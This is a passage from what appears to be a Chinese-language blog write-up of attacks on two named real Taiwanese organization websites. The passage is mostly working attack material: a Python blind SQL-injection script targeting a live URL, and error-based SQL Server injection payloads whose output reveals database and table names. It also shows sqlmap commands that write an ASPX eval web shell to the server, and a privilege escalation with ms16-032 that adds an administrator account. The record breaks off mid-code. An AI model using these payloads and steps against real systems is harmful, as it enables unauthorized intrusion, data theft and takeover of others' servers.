class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent </span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crawl</span>(<span class="params">url,headers</span>):</span></span><br><span class="line">    r=requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysis_node</span>(<span class="params">html_content</span>):</span></span><br><span class="line">    html = etree.HTML(html_content)</span><br><span class="line">    content = html.xpath(<span class="string">&quot;//span[@style=&#x27;font-size:28px&#x27;]/text()&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database_data</span>(<span class="params">url,database_length,payload</span>):</span></span><br><span class="line">    database_name=<span class="string">&quot;&quot;</span></span><br><span class="line">    print(<span class="string">&quot;开始判断数据库的名字————————————————————————————————————————————————————————————————————————————————————————————&quot;</span>)</span><br><span class="line">    min_length=<span class="number">1</span></span><br><span class="line">    max_length=<span class="number">126</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,database_length):</span><br><span class="line">        payload=<span class="string">&quot;&#x27; and if(ascii(substr(database(),%d,1))&gt;&quot;</span>%i</span><br><span class="line">        database_name+=chr(harf_find(min_length,max_length,url,payload))</span><br><span class="line">    print(<span class="string">&quot;数据库的名字为：&quot;</span>+database_name)</span><br><span class="line">    print(<span class="string">&quot;数据库名字判断结束————————————————————————————————————————————————————————————————————————————————————————————--&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">harf_find</span>(<span class="params">min_value,max_value,url,payload</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(min_value&lt;=max_value):</span><br><span class="line">        mid_value=int((min_value+max_value)/<span class="number">2</span>)</span><br><span class="line">        url=<span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890%s%d,1,0)--+&quot;</span>%(payload,mid_value)</span><br><span class="line">        print(<span class="string">&quot;当前url为:&quot;</span>+url)</span><br><span class="line">        html_content=crawl(url,headers)</span><br><span class="line">        last_content=analysis_node(html_content)</span><br><span class="line">        print(last_content)</span><br><span class="line">        <span class="keyword">if</span> last_content:</span><br><span class="line">            min_value=mid_value+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max_value=mid_value<span class="number">-1</span></span><br><span class="line">    mid_value=int((min_value+max_value+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mid_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ua = UserAgent()</span><br><span class="line">    headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>:ua.random&#125;</span><br><span class="line">    database_data_url=<span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&quot;</span></span><br><span class="line">    payload=<span class="string">&quot;&#x27; and if(ascii(substr(database(),%d,1))&gt;&quot;</span></span><br><span class="line">    database_length=<span class="number">13</span></span><br><span class="line">    get_database_data(database_data_url,database_length,payload)</span><br></pre></td></tr></table></figure><h5 id="判断表的长度"><a href="#判断表的长度" class="headerlink" title="判断表的长度"></a>判断表的长度</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent </span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crawl</span>(<span class="params">url,headers</span>):</span></span><br><span class="line">    r=requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysis_node</span>(<span class="params">html_content</span>):</span></span><br><span class="line">    html = etree.HTML(html_content)</span><br><span class="line">    content = html.xpath(<span class="string">&quot;//span[@style=&#x27;font-size:28px&#x27;]/text()&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf_analysis_node</span>(<span class="params">html_content</span>):</span></span><br><span class="line">    html = etree.HTML(html_content)</span><br><span class="line">    content = html.xpath(<span class="string">&quot;//head/title/text()&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_table_length</span>(<span class="params">url</span>):</span></span><br><span class="line">    print(<span class="string">&quot;开始判断表的长度————————————————————————————————————————————————————————————————————————————————————————————&quot;</span>)</span><br><span class="line">    min_length=<span class="number">1</span></span><br><span class="line">    max_length=<span class="number">15</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(min_length,max_length):</span><br><span class="line">        url=<span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if((select length(table_name) from information_schema.tables where table_schema = database() limit 0,1)=%d,1,0)--+&quot;</span>%i</span><br><span class="line">        table_length=harf_find(min_length,max_length,url)</span><br><span class="line">    print(<span class="string">&quot;表的长度为：&quot;</span>+str(table_length))</span><br><span class="line">    print(<span class="string">&quot;表的长度判断结束————————————————————————————————————————————————————————————————————————————————————————————--&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">harf_find</span>(<span class="params">min_value,max_value,url</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(min_value&lt;=max_value):</span><br><span class="line">        mid_value=int((min_value+max_value)/<span class="number">2</span>)</span><br><span class="line">        print(<span class="string">&quot;当前url为:&quot;</span>+url)</span><br><span class="line">        html_content=crawl(url,headers)</span><br><span class="line">        last_content=analysis_node(html_content)</span><br><span class="line">        print(last_content)</span><br><span class="line">        <span class="keyword">if</span> last_content:</span><br><span class="line">            min_value=mid_value+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max_value=mid_value<span class="number">-1</span></span><br><span class="line">    mid_value=int((min_value+max_value+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mid_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ua = UserAgent()</span><br><span class="line">    headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>:ua.random&#125;</span><br><span class="line">    table_length_url=<span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if((select length(table_name) from information_schema.tables where table_schema = database() limit 0,1)=&#123;&#125;,1,0)--+&quot;</span></span><br><span class="line">    get_table_length(table_length_url)</span><br></pre></td></tr></table></figure><p>判断表的名字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1))=&#123;&#125;,1,0)--+&quot;</span></span><br></pre></td></tr></table></figure><p>判断列的长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if((select length(column_name) from information_schema.columns where table_name = test limit 0,1)=&#123;&#125;,1,0)--+&quot;</span></span><br></pre></td></tr></table></figure><p>判断列的名字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name = test limit 0,1),1,1))=&#123;&#125;,1,0)--+&quot;</span></span><br></pre></td></tr></table></figure><h5 id="判断字段的长度"><a href="#判断字段的长度" class="headerlink" title="判断字段的长度"></a>判断字段的长度</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if((select length(user) from test)=&#123;&#125;,1,0)--+&quot;</span></span><br></pre></td></tr></table></figure><p>判断字段的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if(ascii(substr((select user from test),1,1))=&#123;&#125;,1,0)--+&quot;</span></span><br></pre></td></tr></table></figure><h2 id="Exp2"><a href="#Exp2" class="headerlink" title="Exp2"></a>Exp2</h2><p>数据库为sqlserver</p><h3 id="判断字符、数字型、闭合方式-1"><a href="#判断字符、数字型、闭合方式-1" class="headerlink" title="判断字符、数字型、闭合方式"></a>判断字符、数字型、闭合方式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Microsoft OLE DB Provider <span class="keyword">for</span> SQL Server 错误 <span class="string">&#x27;80040e14&#x27;</span></span><br><span class="line"></span><br><span class="line">遗漏字元字串 <span class="string">&#x27; AND 显示状态Flag = 1 ORDER BY 排序 DESC &#x27;</span> 后面的引号。</span><br><span class="line"></span><br><span class="line">D:\S_JCIN\WEBSITE\OUTWEB\L_CT\NEWS\../../../_sysadm/_Function/DB_Function.asp, 列<span class="number">158</span></span><br></pre></td></tr></table></figure><p>数字型。</p><p>判断是否是DBA</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;(select is_srvrolemember(&#39;sysadmin&#39;))</span><br><span class="line">select is_srvrolemember(&#39;sysadmin&#39;) </span><br></pre></td></tr></table></figure><h3 id="判断是否是站库分离"><a href="#判断是否是站库分离" class="headerlink" title="判断是否是站库分离"></a>判断是否是站库分离</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(select host_name()))--&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将 nvarchar 值 &#39;RENHAI&#39; 转换成资料类型 int 时，转换失败。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(select @@servername))--&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将 nvarchar 值 &#39;RENHAI&#39; 转换成资料类型 int 时，转换失败。</span><br></pre></td></tr></table></figure><p>主机名和服务器名一样，不是站库分离。</p><h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1=convert(int,(db_name()))  <span class="comment">#获取当前数据库名</span></span><br><span class="line"></span><br><span class="line">1=convert(int,(@@version))  <span class="comment">#获取数据库版本</span></span><br><span class="line"></span><br><span class="line">1=convert(int,(<span class="keyword">select</span> <span class="keyword">quotename</span>(<span class="keyword">name</span>) <span class="keyword">from</span> master..sysdatabases <span class="keyword">FOR</span> <span class="keyword">XML</span> <span class="keyword">PATH</span>(<span class="string">&#x27;&#x27;</span>))) <span class="comment">#一次性获取全部数据库</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>=<span class="keyword">convert</span>(<span class="built_in">int</span>,(<span class="keyword">select</span> <span class="string">&#x27;|&#x27;</span>%<span class="number">2</span>bname%<span class="number">2</span>b<span class="string">&#x27;|&#x27;</span> <span class="keyword">from</span> master..sysdatabases <span class="keyword">FOR</span> <span class="keyword">XML</span> <span class="keyword">PATH</span>(<span class="string">&#x27;&#x27;</span>)))  <span class="comment">#一次性获取全部数据库</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(select &#39;|&#39; name &#39;|&#39; from master..sysdatabases FOR XML PATH(&#39;&#39;)))&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将 nvarchar 值 &#39;|master||tempdb||model||msdb||RenHai||RenHai2012||Renhai_LightSite||RenhaiDevelop||RenHai2012_bak|&#39; 转换成资料类型 int 时，转换失败。</span><br></pre></td></tr></table></figure><h4 id="USER信息"><a href="#USER信息" class="headerlink" title="USER信息"></a>USER信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;(select IS_SRVROLEMEMBER(&#39;db_owner&#39;)) #查看是否为db_owner权限、sysadmin、public （未测试成功）如果正确则正常，否则报错</span><br><span class="line"></span><br><span class="line">1&#x3D;convert(int,(user)) #查看连接数据库的用户</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;(select IS_SRVROLEMEMBER(&#39;public&#39;))--&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><p>返回正常。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;(select IS_SRVROLEMEMBER(&#39;db_owner&#39;))--&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可能是 BOF 或 EOF 的值为 True，或目前的资料录已被删除。所要求的操作需要目前的资料录。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(user))--&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将 nvarchar 值 &#39;dbo&#39; 转换成资料类型 int 时，转换失败。</span><br></pre></td></tr></table></figure><h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(select quotename(name) from RenHai..sysobjects where xtype&#x3D;&#39;U&#39; FOR XML PATH(&#39;&#39;)))&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将nvarchar 值&#39;[参数表][_WebVisitData][活动相簿主档][活动相簿分类][活动相簿内容][comd_list][D99_CMD][D99_Tmp][comdlist][jiaozhu][职称][订单明细暂存档][会员资料表][订单主档][订单明细档][登入纪录档][产品资料表][sysdiagrams][网站流量][系统设定档][sqlmapoutput][订单暂存档][流水号资料表][订单分类档][单位][订单状态档][太岁表][点灯位置资料表][性别表][庙宇资料表][一般分类][人员][公司基本资料] [人员权限][单位权限][权限][新闻][程式][dtproperties]&#39; 转换成资料类型int 时，转换失败。</span><br></pre></td></tr></table></figure><h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><h5 id="获取注入点的表中的列名"><a href="#获取注入点的表中的列名" class="headerlink" title="获取注入点的表中的列名"></a>获取注入点的表中的列名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 having 1&#x3D;1 --&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">资料行 &#39;新闻.流水号&#39; 在选取清单中无效，因为它并未包含在汇总函式或 GROUP BY 子句中。</span><br></pre></td></tr></table></figure><h5 id="获取任意表中的列名"><a href="#获取任意表中的列名" class="headerlink" title="获取任意表中的列名"></a>获取任意表中的列名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(select * from RenHai..comd_list  where id&#x3D;(select max(id) from test..sysobjects where xtype&#x3D;&#39;u&#39; and name&#x3D;&#39;comd_list&#39;)))&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><h4 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h4><h6 id="判断权限"><a href="#判断权限" class="headerlink" title="判断权限"></a>判断权限</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264%20and%201&#x3D;(select%20is_srvrolemember(%27sysadmin%27))--&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><p>返回正常</p><p>sqlmap一把梭。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sqlmap -u &quot;http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264&amp;Pageno&#x3D;1&quot; -p p0 --os-shell</span><br></pre></td></tr></table></figure><p>根据之前爆出的路径，尝试写入shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:&#x2F;S_JCIN&#x2F;WEBSITE&#x2F;OUTWEB&#x2F;L_CT&#x2F;NEWS&#x2F;</span><br><span class="line">os-shell&gt; echo &#39;&lt;% @Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;&#39;&gt;D:&#x2F;S_JCIN&#x2F;WEBSITE&#x2F;OUTWEB&#x2F;L_CT&#x2F;NEWS&#x2F;steady2.aspx</span><br></pre></td></tr></table></figure><p>回显太慢。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">os-shell&gt; echo &#39;&lt;% @Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;&#39;&gt;D:&#x2F;S_JCIN&#x2F;WEBSITE&#x2F;OUTWEB&#x2F;L_CT&#x2F;NEWS&#x2F;steady2.aspx</span><br><span class="line">do you want to retrieve the command standard output? [Y&#x2F;n&#x2F;a] y</span><br><span class="line">[14:13:34] [WARNING] in case of continuous data retrieval problems you are advised to try a switch &#39;--no-cast&#39; or switch &#39;--hex&#39;</span><br><span class="line">[14:13:34] [WARNING] running in a single-thread mode. Please consider usage of option &#39;--threads&#39; for faster data retrieval</span><br><span class="line">[14:13:34] [INFO] retrieved:</span><br><span class="line">[14:13:35] [WARNING] time-based comparison requires larger statistical model, please wait..................... (done)</span><br><span class="line">[14:13:43] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions</span><br><span class="line">do you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#39;--time-sec&#39;)? [Y&#x2F;n] y</span><br><span class="line">2</span><br><span class="line">[14:13:58] [INFO] retrieved:</span><br><span class="line">[14:13:59] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)</span><br><span class="line">[14:14:14] [INFO] adjusting time delay to 2 seconds due to good response times</span><br><span class="line">這</span><br></pre></td></tr></table></figure><p>直接尝试sqlmap的–file选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sqlmap -u &quot;http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264&amp;Pageno&#x3D;1&quot; --file-write&#x3D;&quot;&#x2F;Users&#x2F;apple&#x2F;Downloads&#x2F;漏洞盒子&#x2F;shell&#x2F;apsx马&#x2F;asp小马&#x2F;2.aspx&quot; --file-dest&#x3D;&quot;D:&#x2F;S_JCIN&#x2F;WEBSITE&#x2F;OUTWEB&#x2F;L_CT&#x2F;NEWS&#x2F;steady123.aspx&quot;</span><br></pre></td></tr></table></figure><p>使用os-shell命令，查看是否上传上去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">os-shell&gt; dir D:\S_JCIN\WEBSITE\OUTWEB\L_CT\NEWS\</span><br><span class="line">2020&#x2F;11&#x2F;17  上午 09:08                 9 shell.aspx</span><br><span class="line">2014&#x2F;12&#x2F;17  下午 05:40               277 sidebar.asp</span><br><span class="line">2020&#x2F;11&#x2F;17  上午 10:55               116 steady.aspx</span><br><span class="line">2020&#x2F;11&#x2F;17  上午 10:56               116 steady.txt</span><br><span class="line">2020&#x2F;11&#x2F;17  上午 11:24                 8 steady1.txt</span><br><span class="line">2020&#x2F;11&#x2F;17  下午 02:28               116 steady123.aspx</span><br></pre></td></tr></table></figure><p>查看马是否连接成功</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">os-shell&gt; type  D:\S_JCIN\WEBSITE\OUTWEB\L_CT\NEWS\steady123.aspx</span><br><span class="line"><span class="keyword">do</span> you want to retrieve the command standard output? [Y/n/a] y</span><br><span class="line">[<span class="number">14</span>:<span class="number">36</span>:<span class="number">13</span>] [INFO] retrieved: <span class="string">&#x27;&lt;%@PAGE LANGUAGE=JSCRIPT%&gt;&#x27;</span></span><br><span class="line">[<span class="number">14</span>:<span class="number">36</span>:<span class="number">13</span>] [INFO] retrieved: <span class="string">&#x27;&lt;%var PAY:String=Request[&quot;\x61\x62\x63\x64&quot;];&#x27;</span></span><br><span class="line">[<span class="number">14</span>:<span class="number">36</span>:<span class="number">13</span>] [INFO] retrieved: <span class="string">&#x27;eval(PAY,&quot;\x75\x6E\x73\x61&quot;+&quot;\x66\x65&quot;);&#x27;</span></span><br><span class="line">[<span class="number">14</span>:<span class="number">36</span>:<span class="number">14</span>] [INFO] retrieved: <span class="string">&#x27;%&gt;&#x27;</span></span><br><span class="line">command standard output:</span><br><span class="line">---</span><br><span class="line">&lt;%@PAGE LANGUAGE=JSCRIPT%&gt;</span><br><span class="line">&lt;%<span class="keyword">var</span> PAY:<span class="keyword">String</span>=Request[<span class="string">&quot;abcd&quot;</span>];</span><br><span class="line"><span class="keyword">eval</span>(PAY,<span class="string">&quot;unsa&quot;</span>+<span class="string">&quot;fe&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><h5 id="exp提权"><a href="#exp提权" class="headerlink" title="exp提权"></a>exp提权</h5><p>使用ms16-032直接提权成功，添加用户，添加用户到管理员组。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; ms16<span class="number">-032.</span>exe <span class="string">&quot;whoami&quot;</span></span><br><span class="line">[<span class="comment">#] ms16-032 for service by zcgonvh</span></span><br><span class="line">[+] SeAssignPrimaryTokenPrivilege was assigned</span><br><span class="line">[!] process with pid: <span class="number">5364</span> created.</span><br><span class="line">==============================</span><br><span class="line">nt authority\system</span><br><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; ms16<span class="number">-032.</span>exe <span class="string">&quot;net user good gongxinao /add&quot;</span></span><br><span class="line">[<span class="comment">#] ms16-032 for service by zcgonvh</span></span><br><span class="line">[+] SeAssignPrimaryTokenPrivilege was assigned</span><br><span class="line">[!] process with pid: <span class="number">1668</span> created.</span><br><span class="line">==============================</span><br><span class="line">命令執行成功。</span><br><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; ms16<span class="number">-032.</span>exe <span class="string">&quot;net localgroup administrators good /add&quot;</span></span><br><span class="line">[<span class="comment">#] ms16-032 for service by zcgonvh</span></span><br><span class="line">[+] SeAssignPrimaryTokenPrivilege was assigned</span><br><span class="line">[!] process with pid: <span class="number">364</span> created.</span><br><span class="line">==============================</span><br><span class="line">命令執行成功</span><br></pre></td></tr></table></figure><p>查看3389是否连接成功，返回为0表示连接成功。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; REG QUERY <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server</span><br><span class="line">    fDenyTSConnections    REG_DWORD    <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>既然是ms16-032直接msf。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 